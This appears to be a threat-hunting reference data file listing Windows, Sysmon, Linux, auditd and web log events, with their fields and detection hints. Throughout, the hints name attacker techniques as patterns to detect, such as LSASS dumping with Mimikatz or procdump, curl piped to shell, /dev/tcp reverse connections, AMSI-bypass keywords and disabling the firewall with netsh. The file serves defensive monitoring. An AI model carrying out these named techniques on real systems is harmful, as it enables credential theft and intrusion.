{"n":"Tamper Protection blocked a change","d":"Someone attempted to change the protection configuration but was blocked.","f":"Value: Registry/setting path the attacker tried to change but was blocked\nOld Value: Previous value of the setting\nNew Value: New value the operation tried to write (blocked)","h":"A clear sign of intent to disable AV."},

{"n":"Script Block Logging","d":"Logs the decoded script content (including -EncodedCommand). Scripts with suspicious keywords are logged at Warning level even when logging isn't enabled.","f":"ScriptBlockText, ScriptBlockId, MessageNumber/MessageTotal (long scripts are split across multiple events)","h":"Keywords: FromBase64String, IEX/Invoke-Expression, DownloadString/DownloadFile, Net.WebClient, Invoke-WebRequest to an IP, AmsiUtils/amsiInitFailed, Reflection.Assembly::Load, VirtualAlloc, -bxor, Invoke-Mimikatz, Get-GPPPassword, Add-MpPreference -ExclusionPath."},

{"n":"Module Logging","d":"Logs each pipeline command and the parameters invoked.","f":"ContextInfo: Host context info (Host Application, engine version, run time)\nPayload: Detailed command content, including CommandInvocation and ParameterBinding\nCommandInvocation: Name of the cmdlet/command invoked in the pipeline\nParameterBinding: Parameter names and values passed to the command\nHost Application: Path of the host process that ran the command (e.g. powershell.exe ...)","h":""},

{"n":"PowerShell engine started (classic log)","d":"Windows PowerShell (classic) log. HostApplication contains the full launch command line.","f":"EngineVersion=2.0: a downgrade to evade AMSI/Script Block Logging","h":"EngineVersion 2.0 on a modern machine; HostApplication other than powershell.exe (PowerShell doesn't require powershell.exe - e.g. rundll32 loading System.Management.Automation)."},

{"n":"Pipeline execution (classic log)","d":"Pipeline execution detail when module logging is enabled.","f":"CommandLine: The full command line/pipeline that was executed\nCommandName: Name of the cmdlet or command in the pipeline\nHostApplication: Host process running PowerShell (e.g. powershell.exe)\nEngineVersion: PowerShell engine version\nRunspaceId / PipelineId: Runspace and pipeline identifiers used to correlate related event 800 records","h":""},

{"n":"Process Create","d":"Process creation with hash, command line, parent process, and OriginalFileName.","f":"OriginalFileName: the original name embedded in the PE, catches a renamed binary\nHashes: MD5/SHA256/IMPHASH per configuration\nParentImage, ParentCommandLine\nIntegrityLevel: Medium/High/System","h":"Image and OriginalFileName don't match; svchost.exe running outside System32; a parent of w3wp.exe/sqlservr.exe/java.exe spawning cmd/powershell (webshell, SQL xp_cmdshell)."},

{"n":"File creation time changed","d":"Timestomping.","f":"Image: Path of the process that changed the file timestamp\nTargetFilename: File whose creation time attribute was modified\nCreationUtcTime: New (forged) creation time value written to the file\nPreviousCreationUtcTime: Original creation time before tampering\nProcessId / ProcessGuid: Identifiers of the process performing the action","h":""},

{"n":"Network Connection","d":"A process's TCP/UDP connection.","f":"Image, DestinationIp, DestinationPort, Initiated","h":"rundll32, regsvr32, mshta, certutil, powershell connecting out to the Internet; regular beaconing to the same IP."},

{"n":"Process Terminated","d":"A process ended.","f":"Image: Path of the process that just terminated\nProcessId / ProcessGuid: Process identifiers, used to correlate with the matching Process Create (ID 1) event\nUser: Account that owned the process\nUtcTime: Time the process terminated","h":""},

{"n":"Driver Loaded","d":"A driver was loaded.","f":"Signed, Signature, SignatureStatus","h":"A driver with a known vulnerability (BYOVD, see loldrivers.io) loaded from a Temp folder; used to kill EDR."},

{"n":"Image Loaded (DLL)","d":"A DLL was loaded. Very noisy, requires filtering configuration.","f":"Image: Process that loaded the DLL\nImageLoaded: Path of the DLL being loaded\nSigned / Signature / SignatureStatus: Digital signature state and details of the DLL\nHashes: Hash of the DLL file (SHA256/IMPHASH...)\nOriginalFileName / Product / Company: Original PE metadata of the DLL, useful for spotting DLLs masquerading under a legitimate name","h":"An unsigned DLL loaded by a signed exe located outside its standard install folder: DLL sideloading."},

{"n":"CreateRemoteThread","d":"A process creates a thread inside another process: a sign of process injection.","f":"SourceImage / SourceProcessId: Process that created the remote thread (attacker/loader)\nTargetImage / TargetProcessId: Process that had a thread injected into it (victim process)\nNewThreadId: ID of the new thread created in the target process\nStartAddress: Memory address where the thread begins execution\nStartModule / StartFunction: Module/function resolved for StartAddress, if any (often empty for injected shellcode)","h":"StartModule is empty (shellcode in dynamically allocated memory)."},

{"n":"Process Access","d":"A process opens a handle to another process. Configure filtering on TargetImage=lsass.exe.","f":"GrantedAccess=0x1010 / 0x1410 / 0x1FFFFF: memory-read rights commonly seen during a dump\nCallTrace containing UNKNOWN or dbghelp.dll/dbgcore.dll: suspicious","h":"rundll32 + comsvcs.dll MiniDump, procdump -ma lsass, Mimikatz; explicitly whitelist legitimate security agents."},

{"n":"File Create","d":"A file was created/overwritten.","f":"Image: Process that created or overwrote the file\nTargetFilename: Path of the file created/overwritten\nCreationUtcTime: File creation time\nProcessId / ProcessGuid: Identifiers of the process performing the action\nUser: Account performing the action","h":"An executable created by Office/a browser/powershell in the Startup, Temp, or Public folder; a new .aspx/.jsp file in the webroot."},

{"n":"Registry: key create/delete / value set / rename","d":"12 create/delete key, 13 set value, 14 rename key.","f":"EventType: Type of registry operation (CreateKey, DeleteKey, SetValue, RenameKey)\nImage: Process performing the registry operation\nTargetObject: Registry key/value path affected\nDetails: New value written (SetValue, ID 13 only)\nNewName: New name of the key (RenameKey, ID 14 only)","h":"Run/RunOnce, Winlogon\\Shell/Userinit, IFEO\\Debugger, Services\\<name>\\ImagePath, CLSID InprocServer32 (COM hijack)."},

{"n":"FileCreateStreamHash (ADS)","d":"An Alternate Data Stream is created; Zone.Identifier shows where the file was downloaded from.","f":"Image: Process that created the Alternate Data Stream\nTargetFilename: The file:stream created (e.g. file:Zone.Identifier)\nHash: Hash of the stream content\nContents: Stream content; for Zone.Identifier it includes ZoneId and HostUrl/ReferrerUrl showing where the file was downloaded from\nUser: Account performing the action","h":""},

{"n":"Named pipe created / connected","d":"A pipe is created (17) or connected to (18).","f":"EventType: PipeCreated (17) or PipeConnected (18)\nPipeName: Named pipe name (e.g. \\\\MSSE-xxxx-server, often associated with C2 tooling like Cobalt Strike/Meterpreter)\nImage: Process that created or connected to the pipe\nProcessId / ProcessGuid: Identifiers of the related process","h":"Cobalt Strike's default pipes: \\MSSE-*-server, \\postex_*, \\status_*, \\msagent_*; PsExec's pipe: \\PSEXESVC."},

{"n":"WMI event filter / consumer / binding","d":"Persistence via a WMI permanent event subscription.","f":"EventType: WmiFilterEvent (19), WmiConsumerEvent (20), or WmiBindingEvent (21)\nOperation: Created/Deleted - the type of change\nName: Name of the filter or consumer\nType: Consumer type (e.g. Command Line = CommandLineEventConsumer)\nDestination: Command/script to run when the condition is met (most important for CommandLineEventConsumer)\nQuery / Consumer / Filter: WQL expression of the filter (19) or the consumer-to-filter link (21)","h":"Any new CommandLine/ActiveScript-type consumer needs investigation."},

{"n":"DNS Query","d":"A DNS query along with the requesting process (Windows 8.1+).","f":"Image: Process that performed the DNS query\nQueryName: Domain name queried\nQueryStatus: Returned status code (0 = success)\nQueryResults: List of IPs returned for the query\nProcessId / ProcessGuid: Process identifiers","h":"A newly registered domain, a cheap TLD, a long random subdomain (DNS tunneling), or an unusual process issuing DNS queries."},

{"n":"File Delete (archived / logged only)","d":"23 deletes the file and keeps a copy in ArchiveDirectory; 26 only logs the event.","f":"Image: Process that deleted the file\nTargetFilename: File that was deleted\nHashes: Hash of the file before deletion\nIsExecutable: Whether the deleted file is an executable (true/false)\nArchived: Whether the file was archived to ArchiveDirectory (ID 23 only; ID 26 does not keep a copy)","h":""},

{"n":"Process Tampering","d":"The in-memory image differs from the file on disk: process hollowing, herpaderping.","f":"Image: Process detected with tampering\nProcessId / ProcessGuid: Identifiers of the affected process\nType: Tampering type (e.g. \"Image is replaced\" for process hollowing, \"Process Herpaderping\")\nUser: Account owning the process","h":""},

{"n":"RDP: network authentication succeeded","d":"RemoteConnectionManager. Logged when the RDP network connection is accepted (NLA), before the actual logon.","f":"User: Account that successfully completed NLA authentication\nDomain: Domain of the account\nSourceNetworkAddress: Source IP address initiating the RDP connection","h":"Source IP outside the permitted jump host/PAM."},

{"n":"Session logon / shell started","d":"LocalSessionManager: 21 session logon succeeded, 22 shell started.","f":"User: Account logging into the RDP session\nSessionID: Terminal Services session ID assigned\nSourceNetworkAddress: Source IP address (present on ID 21 only, not on ID 22 shell start)","h":"Source Network Address of LOCAL means a console logon."},

{"n":"Logoff / disconnect / reconnect","d":"23 logoff, 24 disconnect, 25 reconnect.","f":"User: Account of the session that logged off/disconnected/reconnected\nSessionID: Related Terminal Services session ID\nSourceNetworkAddress: Source IP address at time of disconnect/reconnect (ID 24/25; usually absent on ID 23 logoff)","h":"A reconnect from an IP different from the original logon: the session may have been hijacked."},

{"n":"RdpCoreTS: connection accepted","d":"Also logs unauthenticated connections (scanning, brute force).","f":"Message: Free-text event description (no structured EventData fields); contains the client IP:port that just made a TCP connection to the RDP service","h":""},

{"n":"RDPClient: outbound RDP connection","d":"On the source machine, logs the destination the user RDP'd to. Useful for tracing lateral movement.","f":"Message: Free-text event description containing the name/address of the destination server the RDP ActiveX client is connecting to - logged on the source machine, useful for tracing lateral movement","h":""},

{"n":"Task registered","d":"A new task was registered.","f":"TaskName: Full path of the task (including parent folder) that was registered\nUserContext: Account that registered the task","h":""},

{"n":"Task updated / deleted","d":"140 task updated, 141 task deleted.","f":"TaskName: Full path of the task that was updated/deleted\nUserName / UserContext: Account that performed the update (140) or delete (141) action","h":""},

{"n":"Task launched process / action","d":"129 process launched, 200 action started, 201 action completed.","f":"TaskName: Path of the running task\nActionName: Action/program configured to run (e.g. path to powershell.exe)\nTaskInstanceId: GUID identifying one execution instance, used to correlate 129/200/201 events for the same run\nResultCode: Return code when the action completes (ID 201 only)","h":""},

{"n":"WMI permanent event consumer","d":"Microsoft-Windows-WMI-Activity/Operational. A new consumer binding exists.","f":"Namespace: WMI namespace where the binding was registered (e.g. //./root/subscription)\nEventFilter (ESS): Name and WQL query condition of the filter that triggers the event\nConsumer (CONSUMER): Type and name of the consumer that executes when the filter matches (CommandLineEventConsumer is the most notable)\nPossibleCause: Details of the query/action to be executed, often containing the malicious command line\nOperation: Type of change on the binding (Created/Deleted)","h":""},

{"n":"WinRM / PowerShell Remoting","d":"Microsoft-Windows-WinRM/Operational. 6: logged on the source machine when the WinRM connection is initiated (outbound); 91: logged on the destination/server machine when the WSMan shell session is created (inbound).","f":"Message: Description of the action (Creating WSMan Session on the source host - ID 6; Creating WSMan shell on server on the target host - ID 91)\nResourceUri: WinRM plugin/endpoint used (e.g. http://schemas.microsoft.com/powershell/Microsoft.PowerShell)\nUser: Account performing the connection (mainly present on ID 91, server side)\nConnectionStr/Destination: Destination address for the outbound connection (ID 6, on the source host)","h":"Enter-PSSession/Invoke-Command from a regular workstation to a server."},

{"n":"BITS job downloads a file","d":"Microsoft-Windows-Bits-Client/Operational. 59 starts a job along with the URL.","f":"transferJob / jobId: BITS job name/ID\nname: Job name set by the user or program\nurl: Source URL for the download/upload\nbytesTotal / bytesTransferred: Total size and amount transferred so far\njobOwner / User: Account that owns the BITS job","h":"BITS downloading an exe/dll from an unfamiliar IP or domain."},

{"n":"AppLocker audit / block","d":"8003 would be blocked (audit mode), 8004 was blocked (EXE/DLL). Similarly 8006/8007 for script/MSI.","f":"PolicyName: Rule collection that evaluated the file (Exe, Dll, Script, Msi...)\nFilePath: Full path of the file that was/would be blocked\nFileHash: Hash of the file\nRuleId / RuleName: Rule that matched (empty if blocked due to no allowing rule, i.e. default-deny)\nTargetUser / User: Account (SID) that attempted to run the file","h":""},

{"n":"Windows Firewall: profile / rule added / rule removed","d":"Windows Firewall With Advanced Security/Firewall channel. Some newer Windows versions use different IDs for the same action; verify on the version in use.","f":"RuleId: GUID identifying the firewall rule\nRuleName: Rule name as shown in Windows Firewall\nDirection: Rule direction, Inbound or Outbound\nAction: Rule action, Allow or Block\nApplicationPath / ServiceName: Program/service the rule applies to (empty for port-based rules)\nModifyingApplication / ModifyingUser: Process and account that created/modified/deleted the rule","h":"netsh advfirewall set allprofiles state off; an inbound rule opening an unfamiliar port."},

{"n":"NTLM auditing on DC","d":"Microsoft-Windows-NTLM/Operational on the DC when NTLM auditing is enabled; shows the client machine, user, and destination server using NTLM.","f":"UserName: Account performing NTLM authentication\nDomainName: Domain of the account\nWorkstationName: Workstation requesting authentication (e.g. the SMB client)\nSChannelName: Target machine receiving the authentication (usually the DC when SChannelType=2)\nSChannelType: Secure channel type (2 = between a domain host and a domain controller)","h":"Used to build an NTLM dependency inventory before restricting it."},

{"n":"Unsigned LDAP bind","d":"Directory Service log on the DC: client performs an unsigned LDAP bind or a cleartext simple bind.","f":"Client IP Address: IP:port of the client performing the LDAP bind\nIdentity: Identity (domain\\user) the client authenticated as\nBinding Type: Type of insecure bind - 0 = unsigned SASL, 1 = simple bind without encryption (cleartext)","h":"BindingType 0 = unsigned SASL; 1 = simple bind without TLS (password in cleartext)."},

{"n":"SSH login succeeded with password","d":"sshd accepted password authentication.","f":"Accepted password: sshd confirms the password authentication succeeded\nuser: the account that just logged in (root)\nfrom: source IP address of the connecting client\nport: client-side source TCP port\nssh2: SSH protocol version in use (SSH-2)","h":"Direct root login (PermitRootLogin should be no); a success following a string of Failed password entries from the same IP."},

{"n":"SSH login with key","d":"Includes the key fingerprint, which helps trace which key was used.","f":"Accepted publickey: public-key authentication was accepted\nuser: the account that logged in (deploy)\nfrom: source IP address of the connection\nport: client-side source TCP port\nkey type (RSA): the key algorithm used\nfingerprint SHA256: the key's fingerprint, used to identify exactly which key logged in","h":"Unfamiliar fingerprint for a deploy/service account: check for an added entry in authorized_keys."},

{"n":"SSH wrong password","d":"Includes 'invalid user' if the user doesn't exist.","f":"Failed password: sshd rejected the password authentication attempt\ninvalid user: flags that the attempted username does not exist on the system (if present)\nuser: the username that was attempted\nfrom: source IP address making the attempt\nport: client-side source TCP port\nssh2: SSH protocol version","h":"Count by IP and by user to distinguish brute force from spraying."},

{"n":"SSH with nonexistent user","d":"Username enumeration.","f":"Invalid user: sshd reports the attempted account does not exist on the system\nuser: the username being probed (oracle)\nfrom: source IP address making the attempt\nport: client-side source TCP port","h":""},

{"n":"Max auth attempts exceeded","d":"MaxAuthTries reached within a single connection.","f":"error: maximum authentication attempts exceeded: the MaxAuthTries limit was reached in one connection, connection is dropped\nuser: the account being attempted when the limit was hit\nfrom: source IP address making the attempts\nport: client-side source TCP port\n[preauth]: the event occurred before authentication completed (sshd's preauth phase)","h":""},

{"n":"Incomplete SSH connection (scan)","d":"A scanner opens the TCP connection then closes it without completing the SSH handshake.","f":"kex_exchange_identification: Connection closed by remote host: the client closed the connection mid-way through the key exchange/identification step\nDid not receive identification string: sshd never received an SSH identification string from the client (a sign of a port scanner, not a real SSH client)\nfrom: source IP address of the connection\nport: client-side source TCP port\nsshd[pid]: PID of the child sshd process handling that connection","h":""},

{"n":"Command run via sudo","d":"Logs the user, working directory, target user, and command.","f":"thanhnv (before the colon): the user who actually invoked sudo\nTTY: the terminal device the command was run from\nPWD: the working directory at the time sudo was invoked\nUSER: the target account the command will run as (e.g. root)\nCOMMAND: the full path and arguments of the command executed","h":"sudo bash/su/sh (escapes command restrictions); sudo to vi, find, awk, tar, less (GTFOBins)."},

{"n":"sudo denied","d":"A user without sudo rights attempted sudo, or entered the wrong sudo password.","f":"user NOT in sudoers: the account calling sudo is not listed in sudoers and is rejected outright\nTTY/PWD/USER/COMMAND: same as sudo COMMAND — context of the rejected command\npam_unix(sudo:auth) authentication failure: PAM reports the sudo authentication failed (wrong password)\nlogname/uid/euid: the original login account and current uid/euid\nruser/rhost: remote user/host making the request (usually empty if local)\nuser: the account attempting authentication","h":"www-data, nginx, apache, tomcat attempting sudo: almost certainly a webshell."},

{"n":"Switch user via su","d":"An su session opened or failed.","f":"pam_unix(su:session) session opened for user: confirms the su session opened successfully, with the target account\nby: the source account that performed the su\nuid: the UID corresponding to the account in parentheses\nFAILED SU (to root): line reported when su fails, with the target account\non pts/0: the terminal the su command was run from","h":""},

{"n":"New user created","d":"A new local account.","f":"name: the name of the newly created account\nUID: the UID assigned to the new account (UID=0 is highly suspicious as it collides with root)\nGID: the new account's primary group ID\nhome: the home directory created\nshell: the account's default shell\nfrom: the terminal/device useradd was run from","h":"UID=0 for a non-root user is a clear backdoor; a new user with a shell on an application server."},

{"n":"User added to group","d":"Adding to sudo/wheel/docker grants indirect root privileges.","f":"add 'user' to group: the user was added to the named group (primary privilege group)\nadd 'user' to shadow group: the user was added to the group in /etc/gshadow (corresponding privileges)\ngroup: the group affected (e.g. sudo/wheel/docker grant root-equivalent privilege indirectly)","h":"The docker, lxd, and disk groups are also root-equivalent."},

{"n":"Password changed","d":"An account password was changed.","f":"pam_unix(passwd:chauthtok): the PAM module handling the authentication-token (password) change\npassword changed for: the account whose password was just changed\npasswd[pid]: PID of the passwd process performing the change","h":""},

{"n":"Account temporarily locked after repeated failures","d":"pam_faillock (RHEL 8+) or pam_tally2 (legacy).","f":"pam_faillock(sshd:auth): PAM module recording a temporary account lockout from repeated failures (RHEL 8+)\nConsecutive login failures: number of consecutive failed logins exceeding the configured threshold\nuser: the account temporarily locked\naccount temporarily locked: lockout state, auto-clears after the configured unlock_time","h":""},

{"n":"PAM / systemd-logind session","d":"Used to reconstruct a session timeline.","f":"pam_unix(sshd:session) session opened for user: a PAM session opened for the account, used to build a login/logout timeline\nuid: the UID of the account in the session\nby (uid=0): the account/context that opened the session (0 means opened on behalf of the user by root/system, e.g. via sshd)\nNew session <N> of user: systemd-logind assigns a session ID to the account\nuser: the account that owns the session","h":""},

{"n":"Cron executes a command","d":"Logged each time cron runs a job.","f":"CRON[pid]: PID of the child cron process executing the job\n(user): the account the crontab belongs to and under which the command runs\nCMD: the full command/job text executed by cron","h":"curl/wget piped to sh/bash, a base64 -d command, a job running every minute from /tmp or /dev/shm. On RHEL/CentOS, CRON lines go to /var/log/cron (not /var/log/messages); on Debian/Ubuntu they appear in both /var/log/syslog and /var/log/cron.log."},

{"n":"Crontab modified","d":"A user replaced their crontab.","f":"crontab[pid]: PID of the crontab process handling the change\n(user) first: the account that ran the crontab command (the editor)\nREPLACE: action of replacing the entire crontab content\n(user) second: whose crontab was replaced (the target)","h":"The crontab of a web service account was modified."},

{"n":"Service started","d":"systemd started a unit.","f":"systemd[1]: the systemd process (PID 1) logging unit management\nStarted: the unit finished starting up successfully\n<unit name/description>: the name and description of the service/unit that just ran","h":"A unit with a disguised name (kworker, dbus-helper) whose file lives in /etc/systemd/system and whose ExecStart points to /tmp, /var/tmp, or /dev/shm."},

{"n":"NIC entered promiscuous mode","d":"A packet-capture tool is running (tcpdump, sniffer).","f":"kernel: the source of the message (a message from the OS kernel)\ndevice: the name of the network interface changing mode\nentered promiscuous mode: the NIC now captures all traffic passing by instead of only its own, a sign a sniffer/tcpdump is running","h":"On a server that isn't a network monitoring tool, needs verification."},

{"n":"Out-of-tree / unsigned kernel module loaded","d":"A module not part of the official kernel was loaded.","f":"module name (diamorphine): the name of the kernel module loaded (here matching a well-known rootkit)\nloading out-of-tree module: the module is not part of the official kernel source tree\ntaints kernel: marks the kernel as \"tainted,\" reducing support/debug integrity\nmodule verification failed: the module's signature or required key is missing or invalid\ntainting kernel: confirms the kernel was flagged tainted due to the unsigned module","h":"An unfamiliar module on a production server: suspected rootkit."},

{"n":"Process segfault","d":"Repeated crashes of a network service may indicate a memory-corruption exploit.","f":"<process>[pid] (nginx[2231]): the crashing process and its PID\nsegfault at: the memory address that caused the invalid access\nip: the instruction pointer value at the time of the crash\nsp: the stack pointer value at the time of the crash\nerror <code>: the page-fault error code\nin <lib>[range]: the library/module containing the faulting address and its loaded address range","h":""},

{"n":"OOM killer","d":"Can be caused by an application bug or a cryptominer consuming resources.","f":"Out of memory: Killed process: the kernel proactively killed a process to free RAM when the system ran out of memory\n<pid>: PID of the killed process\n(<name>): name of the killed process (java)\ntotal-vm: total virtual memory the process had allocated\nanon-rss: physical (RSS) anonymous memory (heap/stack) the process was using\nfile-rss: physical memory mapped from files (file-backed) the process was using","h":""},

{"n":"USB storage device attached","d":"A new USB device.","f":"usb <bus-port>: the physical USB port location the device was plugged into\nNew USB device found: kernel event detecting a new USB device\nidVendor: the USB vendor ID (VID)\nidProduct: the USB product ID (PID)\nsd <id>: the SCSI identifier assigned when recognized as a disk\n[sdb] Attached SCSI removable disk: the device node (/dev/sdb) assigned to the removable storage","h":""},

{"n":"Packet logged by firewall","d":"Prefix set by the LOG rule.","f":"IPTABLES-DROP (log prefix): custom label set in the -j LOG rule, used to quickly filter which rule matched\nIN / OUT: the interface the packet entered (IN) or left (OUT); OUT is empty if the packet was blocked before routing\nSRC: source IP address of the packet\nDST: destination IP address of the packet\nPROTO: transport-layer protocol (TCP/UDP/ICMP)\nSPT / DPT: source port (SPT) and destination port (DPT)","h":""},

{"n":"Logging service stopped","d":"rsyslog/journald/auditd stopped.","f":"rsyslogd: name of the logging process (rsyslog daemon)\nsoftware: name of the software that produced the origin message\nswVersion: the rsyslog software version\nx-pid: PID of the rsyslogd process\nexiting on signal <n>: rsyslog received a termination signal (15=SIGTERM) and exited, possibly deliberately stopped to hide logs","h":"Stopped outside a maintenance window; a log gap on the SIEM right after."},

{"n":"Package installed/removed","d":"RHEL 7 and earlier (yum): /var/log/yum.log. RHEL 8+ (dnf, yum is a dnf alias): /var/log/dnf.log and /var/log/dnf.rpm.log. apt: /var/log/apt/history.log and /var/log/dpkg.log.","f":"Start-Date: the timestamp the install/remove session started\nCommandline: the full command invoked (apt-get/yum/dnf...)\nRequested-By: the account (and uid) that requested the operation\nInstall/Upgrade/Erase: the operation type (install/upgrade/remove) and the list of package:arch (version)","h":"Attack/pivot tools installed on the server: nmap, socat, netcat, masscan, proxychains."},

{"n":"wtmp (last)","d":"Successful logon sessions, reboots, shutdowns.","f":"ut_type: record type (LOGIN_PROCESS/USER_PROCESS=login, DEAD_PROCESS=logout, BOOT_TIME/RUN_LVL=reboot/shutdown)\nut_user: username (empty on logout)\nut_line: tty/pts\nut_host: remote host (SSH) or kernel version (boot records)\nut_tv: timestamp","h":"Cross-check against auth.log; wtmp being cleared/empty while auth.log still has data is a sign of tampering."},

{"n":"btmp (lastb)","d":"Failed logon attempts.","f":"ut_user: the username that was tried (may not be a real account)\nut_line: tty/pts (e.g. ssh:notty for an unauthenticated SSH attempt)\nut_host: source IP/host if available\nut_tv: time of the failed attempt","h":""},

{"n":"lastlog","d":"Last logon time per user.","f":"UID: lastlog is indexed by UID, not username\nll_time: time of the most recent successful login\nll_line: tty/pts\nll_host: source host if available","h":"Detects service accounts that have logged in interactively."},

{"n":"utmp (who/w)","d":"Currently active login sessions on the system.","f":"ut_user: the logged-in username\nut_line: tty/pts\nut_pid: PID of the login/shell process\nut_host: source host for a remote login\nut_tv: login time","h":"Cross-check against auth.log/wtmp; a process deliberately not writing to utmp (a hidden session) is a common anti-forensics technique."},

{"n":"Command execution (execve)","d":"Rule: -a always,exit -F arch=b64 -S execve -k exec. One event consists of SYSCALL + EXECVE (arguments) + CWD + PATH + PROCTITLE.","f":"auid: original login user\nuid/euid: effective user\ncomm, exe: the process\nEXECVE a0..aN: each argument\nkey: rule label","h":"uid=33 (www-data) or a service account running bash/sh/python/nc; /dev/tcp in an argument; cwd is an upload directory. auid=4294967295 + a service uid = the command was spawned by a daemon, not a logged-in person."},

{"n":"USER_LOGIN / USER_AUTH","d":"Logged by PAM via sshd, login, sudo.","f":"res=success / res=failed","h":""},

{"n":"USER_CMD","d":"The command (cmd) is hex-encoded; use ausearch -i to decode it.","f":"auid: the original login UID (audit UID), unchanged across sudo/su, used to trace the real human\nuid: the effective UID of the process calling sudo\ncwd: the working directory when sudo was run\ncmd: the command run, hex-encoded (decode with ausearch -i)\nexe: path to the executed binary (/usr/bin/sudo)\nres: the result of execution (success/failed)","h":"cmd=2F62696E2F62617368 decodes to /bin/bash."},

{"n":"ADD_USER / ADD_GROUP","d":"Logged by useradd/groupadd.","f":"auid: the original login UID of the person creating the account\nuid: the effective UID of the process (usually 0, since root privilege is required)\nop: the operation type (adding user)\nid: the UID assigned to the newly created account\nexe: the binary performing the action (/usr/sbin/useradd)\nres: the result of the operation (success/failed)","h":""},

{"n":"USER_CHAUTHTOK","d":"passwd, chpasswd.","f":"auid: the original login UID of the person changing the password\nop: the PAM operation type (PAM:chauthtok = change authentication token)\ngrantors: the PAM module that authorized the action (pam_unix)\nacct: the account whose password was changed\nexe: the binary performing the action (/usr/bin/passwd)\nres: the result (success/failed)","h":""},

{"n":"Watching sensitive files (-w ... -p wa)","d":"Rule: -w /etc/passwd -p wa -k identity; -w /etc/shadow -p wa -k identity; -w /etc/sudoers -p wa -k priv; -w /root/.ssh -p wa -k rootkey.","f":"key: the audit rule label (identity/priv/rootkey) for quickly filtering which watched file this is\nsyscall: the syscall number acting on the file (e.g. 257=openat)\nauid: the original login UID of the person performing the action\ncomm: the running process name (vi/vim)\nexe: the path to the corresponding executed binary\nname (in the PATH record): the file path accessed, matching the -w rule","h":"/etc/shadow read by a process other than passwd/sshd/login; a write to /root/.ssh/authorized_keys."},

{"n":"CONFIG_CHANGE / DAEMON_END","d":"auditctl -D, a deleted rule, or auditd being stopped.","f":"op=remove_rule: the operation of deleting an audit rule (auditctl -D or removing a specific rule)\nkey: the label of the rule removed\nlist: the audit rule filter list number affected\nres: the result of the operation (res=1 means success in CONFIG_CHANGE)\nop=terminate (DAEMON_END): auditd received a stop command and terminated\nauid: the original login UID of the person who made the change/stop","h":"Set -e 2 at the end of the rules file to lock the configuration (changeable only after a reboot)."},

{"n":"AVC","d":"SELinux blocked a policy-violating action.","f":"denied { <perm> }: the action blocked by SELinux (e.g. execute)\npid / comm: the PID and process name that was blocked\nname: the name of the object (file/process) accessed\nscontext: the SELinux context (label) of the source process\ntcontext: the SELinux context of the target object\ntclass / permissive: the object class (file, process, etc.) and SELinux mode (0=enforcing, actually blocked; 1=permissive, log only)","h":"httpd_t/tomcat_t attempting to exec a shell: a sign of a webshell or blocked RCE."},

{"n":"init_module","d":"Rule: -a always,exit -F arch=b64 -S init_module,finit_module,delete_module -k modules.","f":"syscall: the syscall for loading a kernel module (init_module/finit_module, number 175)\ncomm: the process name invoking it (insmod)\nexe: the corresponding executed binary (/usr/bin/kmod)\nkey: the audit rule label (modules)\nauid / uid: the original login UID and the effective UID performing the action\nsuccess: the syscall result (yes/no)","h":""},

{"n":"SOCKADDR connect","d":"Rule: -a always,exit -F arch=b64 -S connect -F a2!=110 -k netconn (noisy, should be scoped by uid).","f":"syscall: the syscall for an outbound network connection (connect, number 42)\nsuccess / exit: the syscall result and the error code returned on failure\nuid: the effective UID of the process making the connection\ncomm / exe: the process name and binary path calling connect\nkey: the audit rule label (netconn)\nsaddr: the hex-encoded sockaddr structure, containing the address family, port, and destination IP (decode with ausearch -i)","h":"ausearch -i decodes saddr into a host and port (e.g. inet host:203.0.113.7 serv:4444)."},

{"n":"ptrace","d":"Rule: -a always,exit -F arch=b64 -S ptrace -k ptrace. Used to inject into or read the memory of another process (credentials).","f":"syscall: the ptrace syscall (number 101) used to trace/manipulate another process\na0: the first ptrace argument, the request code (PTRACE_ATTACH, PTRACE_PEEKTEXT, ...)\ncomm / exe: the process name and binary calling ptrace\nkey: the audit rule label (ptrace)\nauid / uid: the original login UID and the effective UID performing the action","h":""},

{"n":"ANOM_PROMISCUOUS","d":"Equivalent to the kernel log but includes auid.","f":"dev: the name of the network interface changing promiscuous mode\nprom: the new promiscuous state (256=on, 0=off)\nold_prom: the previous promiscuous state\nauid: the original login UID of the context causing the change\nuid / gid: the effective UID/GID at the time\nses: the related session ID (if any)","h":""},

{"n":"Combined log line structure","d":"Read left to right: client IP, ident, user, timestamp, request line, status, bytes, Referer, User-Agent.","f":"$remote_addr: client IP (behind a LB, check X-Forwarded-For instead)\n$request: method + URI + protocol\n$status: response code\n$body_bytes_sent: response size, useful for spotting data exfiltration","h":""},

{"n":"Status codes worth watching when hunting","d":"Quick meanings when analyzing behavior.","f":"401/403 spike: brute force or permission probing\n404 flood from one IP: directory scanning\n405: an invalid method attempted (PUT, DELETE, TRACE)\n499 (nginx): client closed before receiving the response, often seen with time-based SQLi or scanners\n500: processing error, often caused by injection payloads\n502/504: backend down or overloaded\n200 with an unusually large byte count: data exposure","h":""},

{"n":"Access to sensitive admin endpoints","d":"Spring Boot Actuator and configuration files exposed over the web.","f":"%h: source IP making the request (10.30.1.99)\n\"%r\": request line - GET /actuator/heapdump, /actuator/env - sensitive Spring Boot Actuator admin endpoints exposed\n%>s: HTTP status code (200 = successful access, endpoint not protected by auth)\n%b: response size in bytes (104857600 ~ 100MB for the heapdump - sign of a full heap dump)\nUser-Agent: \"python-requests/2.31.0\" - scripted HTTP client, not a browser","h":"Status 200 + a large byte count on /actuator/heapdump, /actuator/env, /actuator/configprops, /.git/config, /.env, /server-status, /phpinfo.php, /WEB-INF/web.xml."},

{"n":"Tomcat / Java app access log","d":"Default is the common pattern (no UA). Should switch to combined and add %D (time in ms).","f":"%h: 10.20.5.23 - source IP of the request\n%t: [24/Oct/2026:09:12:44 +0700] - time the request was received\n\"%r\": \"POST /ttnt-iam/login HTTP/1.1\" - method and path of the Java app's login endpoint\n%s: 302 - status code (redirect after login processing)\n%b: \"-\" - no response body\nlast field (41): request processing time in milliseconds (akin to %D/%T depending on config); the default \"common\" pattern has NO User-Agent, making it hard to fingerprint attack tools","h":""},

{"n":"IIS log structure","d":"Column order follows the #Fields: line in the file.","f":"sc-status / sc-substatus: status code and substatus\nsc-win32-status: Windows error (e.g. 64 = client disconnected)\ntime-taken: processing time (ms)\ncs-username: user if Windows/Basic auth is used","h":""},

{"n":"Common IIS substatus codes","d":"","f":"401.1: logon failure (wrong credentials)\n401.2: failure due to server authentication configuration\n401.3: blocked by ACL on the resource\n403.14: directory listing denied\n404.0: not found\n500.19: web.config configuration error","h":"Many 401.1 on /EWS, /Autodiscover, /owa: Exchange password spraying."},

